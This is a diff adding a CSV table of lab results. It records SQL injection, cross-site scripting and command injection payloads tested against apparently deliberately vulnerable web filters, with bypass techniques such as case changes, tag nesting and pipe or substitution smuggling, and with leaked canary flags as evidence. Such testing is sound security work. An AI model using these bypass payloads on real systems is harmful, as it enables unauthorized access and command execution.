@@ -1,0 +1,19 @@
+family,owasp,role,payload,technique,low_confirmed,medium_confirmed,medium_evidence
+sqli,A03:2021 Injection,naive,admin' OR '1'='1,classic tautology,3/3,0/3,
+sqli,A03:2021 Injection,naive,admin'--,comment out the password check,3/3,0/3,
+sqli,A03:2021 Injection,bypass,admin' oR '1'='1,case: filter only strips ' OR '/' or ',3/3,3/3,canary FLAG-sqli-9f2c-admin-session leaked
+sqli,A03:2021 Injection,bypass,admin'OR'1'='1,whitespace: filter needs spaces around OR,3/3,3/3,canary FLAG-sqli-9f2c-admin-session leaked
+sqli,A03:2021 Injection,bypass,admin'/*,comment: SQLite accepts an unterminated /* */,3/3,3/3,canary FLAG-sqli-9f2c-admin-session leaked
+sqli,A03:2021 Injection,bypass,admin'-#-,filter order: '#' removed after '--' leaves '--',0/3,3/3,canary FLAG-sqli-9f2c-admin-session leaked
+sqli,A03:2021 Injection,benign,alice,negative control,0/3,0/3,
+xss,A03:2021 Injection,naive,<script>alert(1)</script>,classic script tag,3/3,0/3,
+xss,A03:2021 Injection,bypass,<scr<script>ipt>alert(1)</script>,nesting: removal rebuilds the tag,3/3,3/3,live '<script>' tag in response
+xss,A03:2021 Injection,bypass,<SCRIPT>alert(1)</SCRIPT>,case: str_replace is case-sensitive,3/3,3/3,live '<SCRIPT>' tag in response
+xss,A03:2021 Injection,benign,Panic! at the Disco tickets,negative control,0/3,0/3,
+cmdi,A03:2021 Injection,naive,127.0.0.1; whoami,';' separator,3/3,0/3,
+cmdi,A03:2021 Injection,naive,127.0.0.1 && whoami,'&&' chaining,3/3,0/3,
+cmdi,A03:2021 Injection,bypass,127.0.0.1 | whoami,pipe is not on the blocklist,3/3,3/3,would_run='ping -c 1 127.0.0.1 | whoami'
+cmdi,A03:2021 Injection,bypass,127.0.0.1 & whoami,single '&' (background) not on the list,3/3,3/3,would_run='ping -c 1 127.0.0.1 & whoami'
+cmdi,A03:2021 Injection,bypass,127.0.0.1 $(whoami),command substitution not on the list,3/3,3/3,would_run='ping -c 1 127.0.0.1 $(whoami)'
+cmdi,A03:2021 Injection,bypass,127.0.0.1 &;& whoami,filter order: removing ';' rebuilds '&&',3/3,3/3,would_run='ping -c 1 127.0.0.1 && whoami'
+cmdi,A03:2021 Injection,benign,example.com,negative control,0/3,0/3,
